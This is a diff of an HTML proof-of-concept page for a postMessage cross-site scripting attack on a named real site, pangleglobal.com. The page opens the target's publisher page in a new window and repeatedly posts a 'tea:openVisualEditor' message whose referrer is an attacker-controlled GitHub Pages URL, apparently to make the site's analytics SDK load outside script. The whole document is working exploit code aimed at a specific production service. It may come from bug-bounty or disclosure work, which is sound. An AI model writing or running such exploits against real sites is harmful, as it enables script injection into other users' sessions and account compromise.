@@ -1,30 +1,52 @@
-<!-- poc.html — pakai window.open instead -->
 <html>
 <body>
-<h2>postMessage XSS PoC</h2>
-<p id="status">Click button to start</p>
-<button onclick="startPoC()">Launch PoC</button>
+<h2>postMessage XSS PoC — pangleglobal.com</h2>
+<p id="status">Click button to start PoC</p>
+<div id="log" style="font-family:monospace;margin-top:10px"></div>
+<button onclick="startPoC()" style="padding:10px 20px;font-size:16px">
+  🚀 Launch PoC
+</button>
 <script>
 const ATTACKER = 'https://telojos11.github.io/cekcek';
 
+function log(msg) {
+  document.getElementById('log').innerHTML += '<br>' + msg;
+  console.log(msg);
+}
+
 function startPoC() {
-  document.getElementById('status').textContent = 'Opening target...';
+  log('Step 1: Opening target...');
   
-  // Buka target di window baru
-  const target = window.open('https://www.pangleglobal.com/publisher/companyInfo');
+  const target = window.open(
+    'https://www.pangleglobal.com/publisher/companyInfo', 
+    '_blank'
+  );
   
-  setTimeout(() => {
-    document.getElementById('status').textContent = 'Sending payload...';
+  if (!target) {
+    log('❌ Popup blocked!');
+    return;
+  }
+
+  // Kirim berkali-kali dengan interval untuk pastikan Tea SDK sudah load
+  let attempts = 0;
+  const interval = setInterval(() => {
+    attempts++;
+    log(`Attempt ${attempts}: sending payload...`);
     
-    // Kirim ke semua window (broadcast)
-    target.postMessage(JSON.stringify({
-      type: 'tea:openVisualEditor',
-      payload: { referrer: ATTACKER }
-    }), '*');
+    try {
+      target.postMessage(JSON.stringify({
+        type: 'tea:openVisualEditor',
+        payload: { referrer: ATTACKER }
+      }), '*');
+    } catch(e) {
+      log('Error: ' + e.message);
+    }
     
-    document.getElementById('status').textContent = 
-      'Payload sent! Check the opened window for XSS execution.';
-  }, 3000); // tunggu 3 detik untuk page load
+    if (attempts >= 5) {
+      clearInterval(interval);
+      log('✅ All attempts done. Check target window.');
+    }
+  }, 2000); // kirim setiap 2 detik, 5x = 10 detik total
 }
 </script>
 </body>
